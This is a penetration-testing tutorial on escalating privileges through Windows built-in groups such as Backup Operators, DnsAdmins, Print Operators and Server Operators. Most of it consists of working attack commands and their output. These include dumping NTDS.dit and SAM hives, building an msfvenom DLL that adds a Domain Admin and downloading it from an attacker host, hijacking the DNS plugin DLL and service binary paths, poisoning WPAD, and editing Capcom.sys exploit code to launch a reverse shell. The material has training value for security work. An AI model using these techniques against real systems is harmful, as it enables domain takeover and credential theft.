## 1. Why Built-in Groups Matter

Windows (and especially Active Directory Domain Controllers) ships with a set of **built-in groups** designed to let organizations delegate specific administrative tasks — like backups or printer management — without handing out full **Domain Admin** or **Enterprise Admin** rights. This is a good security practice in theory (the principle of **least privilege**: give people only the access they actually need).

**Analogy:** Think of these groups as specialized staff badges in a large office building — a "Mailroom" badge, a "Facilities" badge, a "IT Helpdesk" badge — each opening a narrow set of doors relevant to that job, instead of everyone carrying the building owner's master key.

In practice, though, these groups are often **more dangerous than they look**, for a few reasons:
- Vendor software sometimes needs elevated rights, so a service account gets added to one of these groups as a shortcut.
- Accounts get added "temporarily" for testing and are simply never removed.
- The people managing these systems don't always realize just how powerful some of these "limited" groups really are.

These groups have existed from **Windows Server 2008 R2 onward**, with one exception: **Hyper-V Administrators**, introduced in **Server 2012**.

The six groups covered here:

| Group | Group | Group |
|---|---|---|
| Backup Operators | Event Log Readers | DnsAdmins |
| Hyper-V Administrators | Print Operators | Server Operators |

> **A standard first step on any assessment:** run `whoami /groups` once you have a shell, and cross-reference the results against this list. As both an attacker and a defender, it's worth listing every member of these groups as an appendix in your assessment report, so the client can review whether that level of access is still actually needed.

## 2. Backup Operators

### What the privilege actually does

Membership in **Backup Operators** grants two powerful privileges: `SeBackupPrivilege` and `SeRestorePrivilege`.

`SeBackupPrivilege` lets you **traverse any folder and read any file's contents — completely bypassing normal permission checks (ACLs)** — because the whole point of a backup tool is to be able to read everything, even files you're not personally permitted to open.

**Analogy:** Think of this privilege as a master key specifically engraved "FOR BACKUP USE ONLY." It opens every door in the building, but there's a catch: the door frame is rigged to only accept the key if you insert it using a very specific motion (a special technical flag). The regular doorknob (standard `copy` command) won't work — you need purpose-built backup software that knows the trick.

That "special motion" is the `FILE_FLAG_BACKUP_SEMANTICS` flag, which must be specified when opening a file for this bypass to work — which is why the standard Windows `copy` command can't be used directly; you need a tool built to use that flag.

### Step-by-step: Copying a Protected File

**Step 1 — Load the helper libraries** (We can use this [PoC](https://github.com/giuliano108/SeBackupPrivilege) a community PowerShell module that wraps the backup-semantics trick):
```
PS C:\evilcorp> Import-Module .\SeBackupPrivilegeUtils.dll
PS C:\evilcorp> Import-Module .\SeBackupPrivilegeCmdLets.dll
```

**Step 2 — Check if the privilege is actually enabled** (remember: being *granted* a privilege and having it *enabled* in your current token are two different things):
```
PS C:\evilcorp> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeBackupPrivilege             Back up files and directories  Disabled
SeRestorePrivilege            Restore files and directories  Disabled
SeShutdownPrivilege           Shut down the system           Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
```

Or check more directly with the module's own cmdlet:
```
PS C:\evilcorp> Get-SeBackupPrivilege

SeBackupPrivilege is disabled
```

> **Heads-up:** depending on the server's configuration, you may need to open an **elevated** console first (to get past UAC) before you're able to enable this privilege at all.

**Step 3 — Enable it:**
```
PS C:\evilcorp> Set-SeBackupPrivilege
PS C:\evilcorp> Get-SeBackupPrivilege

SeBackupPrivilege is enabled
```

**Step 4 — Use it to bypass a permission denial.** First, confirm you're actually blocked normally:
```
PS C:\evilcorp> cat 'C:\Confidential\2021 Contract.txt.txt'

cat : Access to the path 'C:\Confidential\2021 Contract.txt.txt' is denied.
```

Then copy the file using the privilege-aware cmdlet instead of the normal `copy`/`cat`:
```
PS C:\evilcorp> Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt.txt' .\Contract.txt

Copied 88 bytes

PS C:\evilcorp>  cat .\Contract.txt

Inlanefreight 2021 Contract
==============================
Board of Directors:
<...rest of confidential document contents...>
```

Sensitive data, read without ever having standard permission to access it.

### The Big Prize: Copying NTDS.dit from a Domain Controller

Backup Operators can also **log on locally to a Domain Controller (DC)**. This opens the door to one of the highest-value targets in an entire Active Directory environment: **`NTDS.dit`** — the Active Directory database file, which contains NTLM password hashes for **every user and computer account in the domain**.

**The catch:** `NTDS.dit` is always locked by the running operating system and isn't normally accessible, even to privileged users, while the system is live.

**The workaround — shadow copies.** Windows' built-in `diskshadow` utility can create a frozen, point-in-time snapshot of an entire drive. Since the snapshot isn't the "live" file in active use, `NTDS.dit` inside it isn't locked. We can use the Windows `diskshadow` utility to create a shadow copy of the `C` drive and expose it as `E` drive.

```
PS C:\evilcorp> diskshadow.exe

DISKSHADOW> set verbose on
DISKSHADOW> set metadata C:\Windows\Temp\meta.cab
DISKSHADOW> set context clientaccessible
DISKSHADOW> set context persistent
DISKSHADOW> begin backup
DISKSHADOW> add volume C: alias cdrive
DISKSHADOW> create
DISKSHADOW> expose %cdrive% E:
DISKSHADOW> end backup
DISKSHADOW> exit

PS C:\evilcorp> dir E:

    Directory: E:\

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         5/6/2021   1:00 PM                Confidential
d-----         5/6/2021   1:05 PM                Tools
d-r---         5/6/2021  12:51 PM                Users
d-----        3/24/2021   6:38 PM                Windows
```

**What each DiskShadow command roughly does:**

| Command | Purpose |
|---|---|
| `set metadata ...` | Where to store the shadow copy's metadata file |
| `set context clientaccessible` / `persistent` | Makes the snapshot stick around and be usable, rather than disappearing immediately |
| `add volume C: alias cdrive` | Marks the `C:` drive for snapshotting, under a temporary nickname |
| `create` | Actually takes the snapshot |
| `expose %cdrive% E:` | Mounts the frozen snapshot as a new drive letter, `E:`, so you can browse it like a normal drive |

Now the snapshot's `E:\Windows\NTDS\ntds.dit` can simply be copied using the same `SeBackupPrivilege` trick as before:
```
PS C:\evilcorp> Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit

Copied 16777216 bytes
```

**Important technical nuance:** even an explicit **"deny" permission entry** on a file or folder for your account (or a group you belong to) does **not** block this technique by itself — as long as `SeBackupPrivilege` is enabled and the file is opened using proper backup semantics (`FILE_FLAG_BACKUP_SEMANTICS`), the backup bypass overrides normal ACL deny rules too.

### Bonus: Backing Up Registry Hives

The same privilege also lets you back up the **SAM** and **SYSTEM** registry hives (which together hold local account password hashes):
```
C:\evilcorp> reg save HKLM\SYSTEM SYSTEM.SAV
C:\evilcorp> reg save HKLM\SAM SAM.SAV
```
These can then be fed into a tool like Impacket's `secretsdump.py` to extract local account credentials offline.

## 3. Event Log Readers

### The Defensive Side First

When **process creation auditing** (and logging of the exact command line used) is turned on, Windows records it as **Event ID 4688** ("A new process has been created") in the Security event log. Organizations use this to spot suspicious behavior — like `whoami`, `netstat`, or `tasklist` suddenly running from a marketing employee's workstation, where that would be completely out of character.

This is a genuinely effective, low-cost defensive measure: enabling this kind of auditing, shipping the logs to a SIEM (Security Information and Event Management) tool, and setting up alerts for suspicious commands can give real visibility into a network — without needing an expensive enterprise EDR (Endpoint Detection and Response) product, which can be out of financial reach for smaller organizations.

> **Real anecdote from the field:** during one penetration test against a mid-sized organization with a small security team and no enterprise EDR — but exactly this kind of command-line auditing in place — a team member's activity was caught and contained the moment they ran `tasklist` from a compromised finance-department workstation. A simple, inexpensive logging setup stopped the attack cold.

### The Offensive Angle

Members of the **Event Log Readers** group (along with Administrators) can read this Security event log. Why would this matter to an attacker? Because many built-in Windows commands **accept passwords directly as a command-line parameter** — and if command-line auditing is turned on, those passwords get captured in plaintext, sitting in the log for anyone with read access to find.

**Analogy:** Imagine a company installs security cameras specifically to catch intruders — but an employee occasionally says their password out loud while walking past one of those cameras. Anyone with access to the camera footage (not just security staff) now has that password too.

### Checking Group Membership

```
C:\evilcorp> net localgroup "Event Log Readers"

Alias name     Event Log Readers
Comment        Members of this group can read event logs from local machine

Members

-------------------------------------------------------------------------------
logger
The command completed successfully.
```

### Searching Logs for Leaked Passwords

**Method 1 — `wevtutil` (built-in command-line tool):**
```
PS C:\evilcorp> wevtutil qe Security /rd:true /f:text | Select-String "/user"

        Process Command Line:   net use T: \\fs01\backups /user:tim MyStr0ngP@ssword
```
A command-line password, captured directly from the log — here, used to mount a network drive.

You can also run this against a remote machine using alternate credentials:
```
C:\evilcorp> wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 | findstr "/user"
```

**Method 2 — PowerShell's `Get-WinEvent`:**
```
PS C:\evilcorp> Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}

CommandLine
-----------
net use T: \\fs01\backups /user:tim MyStr0ngP@ssword
```

> **Important caveat:** unlike `wevtutil`, using `Get-WinEvent` to search the **Security** log specifically requires either **administrator access**, or special registry permission adjustments on `HKLM\System\CurrentControlSet\Services\Eventlog\Security`. **Simply being a member of Event Log Readers is not, on its own, enough for this particular cmdlet.**

**Other logs worth checking:** the **PowerShell Operational log** can also leak sensitive data or credentials if script block or module logging is enabled — and unlike the Security log, this one is readable by **unprivileged users** by default.

## 4. DnsAdmins

### The Core Vulnerability

Members of **DnsAdmins** manage DNS settings across the network. The Windows DNS service supports loading **custom plugin DLLs** to help resolve queries outside its normal zones — and critically, the built-in `dnscmd` tool lets a DnsAdmins member set the path to that plugin DLL **with zero verification that the file is safe or even a real DLL**.

Since the DNS service itself runs as **`NT AUTHORITY\SYSTEM`**, getting it to load your own malicious DLL means your code runs with full SYSTEM privileges — a direct path to compromising the entire server (commonly a Domain Controller, since DNS is frequently hosted there).

As detailed in this excellent [post](https://adsecurity.org/?p=4064), the following attack can be performed when DNS is run on a Domain Controller (which is very common):

**The attack chain, step by step:**
1. DNS management happens over RPC (Remote Procedure Call).
2. The `ServerLevelPluginDll` setting lets you specify an arbitrary DLL path with no validation, via `dnscmd`.
3. Running the right `dnscmd` command (as a DnsAdmins member) writes this path into the registry at `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DNS\Parameters\ServerLevelPluginDll`.
4. The next time the DNS service restarts, it loads whatever DLL is at that path.
5. That DLL can do anything — spawn a reverse shell, or even load a tool like Mimikatz to dump credentials.

### Walkthrough

**Step 1 — Build a malicious DLL.** Here, one that adds a new user to the Domain Admins group:
```
$ msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll

Payload size: 313 bytes
Final size of dll file: 5120 bytes
Saved as: adduser.dll
```

**Step 2 — Host it locally and download it to the target:**
```
$ python3 -m http.server 7777
```
```
PS C:\evilcorp>  wget "http://10.10.14.3:7777/adduser.dll" -outfile "adduser.dll"
```

**Step 3 — Confirm the restriction exists.** Trying this as a regular, non-privileged user fails as expected:
```
C:\evilcorp> dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll

DNS Server failed to reset registry property.
    Status = 5 (0x00000005)
Command failed: ERROR_ACCESS_DENIED
```

**Step 4 — Confirm DnsAdmins membership**, then retry successfully:
```
PS C:\evilcorp> Get-ADGroupMember -Identity DnsAdmins

name              : netadm
SamAccountName    : netadm
```
```
C:\evilcorp> dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll

Registry property serverlevelplugindll successfully reset.
Command completed successfully.
```

> **Note:** you must specify the **full path** to the DLL, or this won't work correctly. Also, DnsAdmins group members specifically use the `dnscmd` *tool* for this — they don't have direct permission to edit that registry key by any other means.

**Step 5 — Trigger the DLL load.** This requires restarting the DNS service — which DnsAdmins membership alone doesn't grant, but which an administrator might grant separately. Here, the account in this example *did* have extra permissions on the DNS service specifically (not through DnsAdmins membership itself):

```
C:\evilcorp> wmic useraccount where name="netadm" get sid

SID
S-1-5-21-669053619-2741956077-1013132368-1109
```
```
C:\evilcorp> sc.exe sdshow DNS

D:(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SO)(A;;RPWP;;;S-1-5-21-669053619-2741956077-1013132368-1109)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)
```
This raw string is written in **SDDL (Security Descriptor Definition Language)**. Per this [article](https://www.winhelponline.com/blog/view-edit-service-permissions-windows/), we can see that our user has RPWP permissions which translate to SERVICE_START and SERVICE_STOP, respectively — meaning this specific user has the right to start and stop the DNS service.

```
C:\evilcorp> sc stop dns
C:\evilcorp> sc start dns
```

**Step 6 — Confirm success.** If the custom DLL ran as intended, the targeted user should now appear in Domain Admins:
```
C:\evilcorp> net group "Domain Admins" /dom

Group name     Domain Admins
Members
-------------------------------------------------------------------------------
Administrator            netadm
The command completed successfully.
```

### ⚠️ Cleanup Is Essential

Stopping and restarting DNS on a live Domain Controller is a **highly destructive action** — it can disrupt DNS resolution for an entire Active Directory environment. **Always get explicit client permission before attempting this**, and be ready to either clean up thoroughly or clearly document how to revert the changes.

**Step 1 — Confirm the malicious registry key exists:**
```
C:\evilcorp> reg query \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters

    ServerLevelPluginDll    REG_SZ    adduser.dll
```
*(A handful of unrelated, pre-existing DNS configuration values — `GlobalQueryBlockList`, `Forwarders`, `BootMethod`, etc. — were trimmed from this output since they aren't part of the attack.)*

**Step 2 — Remove it:**
```
C:\evilcorp> reg delete \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters  /v ServerLevelPluginDll

Delete the registry value ServerLevelPluginDll (Yes/No)? Y
The operation completed successfully.
```

**Step 3 — Restart DNS cleanly** and confirm it's running normally again (also worth confirming with a quick `nslookup` against the domain):
```
C:\evilcorp> sc.exe start dns
C:\evilcorp> sc query dns

STATE              : 4  RUNNING
```

### Alternative Technique: Creating a Malicious WPAD Record

DnsAdmins membership also grants the right to **disable the DNS "global query block list."** By default, this list blocks DNS lookups for two specific, historically dangerous names: **WPAD** (Web Proxy Automatic Discovery Protocol) and **ISATAP** (Intra-Site Automatic Tunnel Addressing Protocol) — both are notoriously easy to hijack, and normally **any** domain user can create a DNS record or computer object using those names.

**The idea:** disable that protective block, create a WPAD record pointing to your own attacker-controlled machine, and every device on the network still using default WPAD settings will start **routing its web traffic through your machine** — letting you run a tool like **Responder** or **Inveigh** to capture password hashes (for offline cracking) or perform an **SMB relay attack**.

```
# We first disabled the global query block list: 
PS C:\evilcorp> Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.evilcorp.local

# Next, we add a WPAD record pointing to our attack machine:
PS C:\evilcorp> Add-DnsServerResourceRecordA -Name wpad -ZoneName evilcorp.local -ComputerName dc01.evilcorp.local -IPv4Address 10.10.14.3
```

## 5. Hyper-V Administrators

If any of an organization's **Domain Controllers run as virtual machines**, then anyone with full control over the virtualization layer (Hyper-V Administrators) should be treated as **equivalent to Domain Admins** — because they can simply clone the live DC's virtual disk, mount it offline, and pull `NTDS.dit` straight out of it without ever touching the running DC.

### A Second, More Technical Path: The VHDX Hard Link Trick

There's a [documented quirk](https://decoder.cloud/2020/01/20/from-hyper-v-admin-to-system/) in how Hyper-V handles **deleting a virtual machine**: the `vmms.exe` process tries to restore the original file permissions on the VM's `.vhdx` (virtual hard disk) file — and does so running as `NT AUTHORITY\SYSTEM`, **without impersonating the requesting user**. 

The trick: delete the `.vhdx` file, then create a **native hard link** that makes that same filename secretly point to a different, protected SYSTEM file instead. When `vmms.exe` "restores permissions" on what it thinks is the VM disk file, it's actually granting you permissions on that other protected file.

If the target is vulnerable to **CVE-2018-0952** or **CVE-2019-0841**, this alone can be leveraged to full SYSTEM access. Otherwise, you can aim the hard-link trick at a **service that any unprivileged user can start, but which runs as SYSTEM** — for example, the **Mozilla Maintenance Service** (installed alongside Firefox). We can update this [exploit](https://raw.githubusercontent.com/decoder-it/Hyper-V-admin-EOP/master/hyperv-eop.ps1) (a proof-of-concept for NT hard link) to grant our current user full permissions on the file below:

```
C:\evilcorp> takeown /F C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
```
After taking ownership of that file (via the hard-link trick), replace it with a malicious executable, then simply start the service to trigger execution as SYSTEM:
```
C:\evilcorp> sc.exe start MozillaMaintenance
```

> **Note:** Microsoft patched this specific hard-link behavior in the **March 2020** security updates, so this particular vector no longer works on fully patched systems.

## 6. Print Operators

**Print Operators** grants its members `SeLoadDriverPrivilege`, rights to manage printers connected to a Domain Controller, and — notably — the ability to **log on locally to a Domain Controller and shut it down.**

### Getting Past UAC First

Just like earlier examples, if you don't see `SeLoadDriverPrivilege` listed in `whoami /priv` from a non-elevated console, you'll need to bypass UAC (User Account Control) or open an elevated session with the Print Operators account's credentials:

```
C:\evilcorp> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name           Description                          State
======================== =================================    =======
SeIncreaseQuotaPrivilege Adjust memory quotas for a process   Disabled
SeChangeNotifyPrivilege  Bypass traverse checking             Enabled
SeShutdownPrivilege      Shut down the system                 Disabled
```
After elevating:
```
C:\evilcorp> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ==================================  ==========
SeLoadDriverPrivilege         Load and unload device drivers       Disabled
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
```

Now `SeLoadDriverPrivilege` is visible — just not enabled yet.

### The Capcom.sys Exploit

There's a well-known vulnerable driver, **`Capcom.sys`**, which contains a flaw letting **any user who can load it** run shellcode with **SYSTEM** privileges. `SeLoadDriverPrivilege` is exactly what's needed to load a driver like this one.

### No GUI Access? Here's the Workaround

If you only have a non-interactive shell (no desktop to pop a new window on), you'll need to modify `ExploitCapcom.cpp`'s source before compiling — specifically, swapping out the line that launches `cmd.exe` for something that calls back to you instead.

```C
// Launches a command shell process
static bool LaunchShell()
{
    TCHAR CommandLine[] = TEXT("C:\\Windows\\system32\\cmd.exe");
    PROCESS_INFORMATION ProcessInfo;
    STARTUPINFO StartupInfo = { sizeof(StartupInfo) };
    if (!CreateProcess(CommandLine, CommandLine, nullptr, nullptr, FALSE,
        CREATE_NEW_CONSOLE, nullptr, nullptr, &StartupInfo,
        &ProcessInfo))
    {
        return false;
    }

    CloseHandle(ProcessInfo.hThread);
    CloseHandle(ProcessInfo.hProcess);
    return true;
}
```

Here we can edit line 292 and replace `"C:\\Windows\\system32\\cmd.exe"` with, say, a reverse shell binary created with `msfvenom`, for example: `c:\ProgramData\revshell.exe`.
```cpp
// Before:
TCHAR CommandLine[] = TEXT("C:\\Windows\\system32\\cmd.exe");

// After:
TCHAR CommandLine[] = TEXT("C:\\ProgramData\\revshell.exe");
```
You'd then set up a listener matching whatever payload `revshell.exe` was generated with (e.g., via `msfvenom`). If a reverse connection gets blocked by a firewall, a bind shell or an "add user" style payload are good fallback options.

## 7. Server Operators

**Server Operators** lets members administer Windows servers — including logging in locally to Domain Controllers — **without** needing full Domain Admin rights. Membership grants `SeBackupPrivilege` and `SeRestorePrivilege` (covered in Section 2) plus the ability to **control local Windows services**.

### Finding a SYSTEM-Level Service to Hijack

**Step 1 — Pick a target service and confirm it runs as SYSTEM.** Here, the built-in **AppReadiness** service:
```
C:\evilcorp> sc qc AppReadiness

SERVICE_NAME: AppReadiness
        BINARY_PATH_NAME   : C:\Windows\System32\svchost.exe -k AppReadiness -p
        SERVICE_START_NAME : LocalSystem
```

**Step 2 — Check whether Server Operators has control over it**, using the Sysinternals tool `PsService`:
```
C:\evilcorp> c:\Tools\PsService.exe security AppReadiness

SERVICE_NAME: AppReadiness
        ACCOUNT: LocalSystem
        SECURITY:
        [ALLOW] BUILTIN\Administrators
                All
        [ALLOW] BUILTIN\Server Operators
                All
```

This confirms **Server Operators has full (`SERVICE_ALL_ACCESS`) control** over this service — meaning they can reconfigure it however they like.

### The Attack: Reconfiguring the Service's Binary Path

**Step 1 — Confirm you're not already a local admin:**
```
C:\evilcorp> net localgroup Administrators

-------------------------------------------------------------------------------

Enterprise Admins

```

**Step 2 — Change the service's "binary path" to a command of your choosing** — here, one that adds a new account to the local Administrators group:
```
C:\evilcorp> sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"

[SC] ChangeServiceConfig SUCCESS
```

**Step 3 — Attempt to start the service.** It's actually *expected* to fail — the point isn't for the service to run correctly, just for Windows to momentarily execute your substituted command when it tries:
```
C:\evilcorp> sc start AppReadiness

The service did not respond to the start or control request in a timely fashion.
```

**Step 4 — Confirm the real goal succeeded anyway:**
```

-------------------------------------------------------------------------------
Administrator
Domain Admins
Enterprise Admins

The command completed successfully.
```

| Group | Key Privilege/Capability | Primary Abuse Path |
|---|---|---|
| **Backup Operators** | `SeBackupPrivilege`, `SeRestorePrivilege` | Read any file bypassing ACLs; copy `NTDS.dit` via shadow copy for full domain credential dump |
| **Event Log Readers** | Read the Security event log | Hunt for plaintext passwords leaked in logged command lines |
| **DnsAdmins** | Load arbitrary DLL into the SYSTEM-level DNS service | Malicious plugin DLL on service restart, or WPAD poisoning for credential capture |
| **Hyper-V Administrators** | Full control of virtualized hosts (incl. virtual DCs) | Clone/mount virtual DC disks for `NTDS.dit`; VHDX hard-link trick for local SYSTEM access |
| **Print Operators** | `SeLoadDriverPrivilege` | Load a vulnerable signed driver (e.g. `Capcom.sys`) to run SYSTEM-level shellcode |

## 9. Big-Picture Takeaways

1. "Limited" built-in groups like Backup Operators, DnsAdmins, and Print Operators are frequently **as dangerous as full Domain Admin** once you understand what their specific privileges actually allow.
2. `SeBackupPrivilege` is a goldmine: it bypasses normal file permissions entirely (even explicit "deny" entries), and combined with shadow copies, it's a direct route to extracting the entire domain's password database from a Domain Controller.
3. Security logging (like command-line auditing) is a double-edged sword — it's genuinely effective for catching attackers, but it can also leak plaintext passwords typed into command-line tools, which then become readable by anyone in the Event Log Readers group.
4. DnsAdmins' ability to load arbitrary, unverified DLLs into a SYSTEM-level service is a textbook example of a convenience feature becoming a severe security hole.
5. Virtualization administrators (Hyper-V Administrators) should always be treated as equivalent to Domain Admins whenever any Domain Controllers are virtualized — they can bypass live system protections entirely by manipulating the underlying virtual disk.
6. Vulnerable signed drivers (like `Capcom.sys`) combined with a privilege as narrow-sounding as "load and unload device drivers" can lead directly to full SYSTEM code execution.
7. Server Operators' ability to reconfigure *any* local service is a simple but devastating technique — no exploit code required, just changing what command a privileged service runs on startup.
8. Several of these techniques (DNS service restarts, Hyper-V VM manipulation) are genuinely destructive to production systems — always get explicit client authorization and have a clear cleanup/rollback plan before attempting them on a real engagement.
9. Across nearly every example here, the end goal is the same: turn a narrow, "least privilege" delegation into either a stolen credential database or a SYSTEM-level shell — a powerful reminder of why group memberships need regular, careful review.
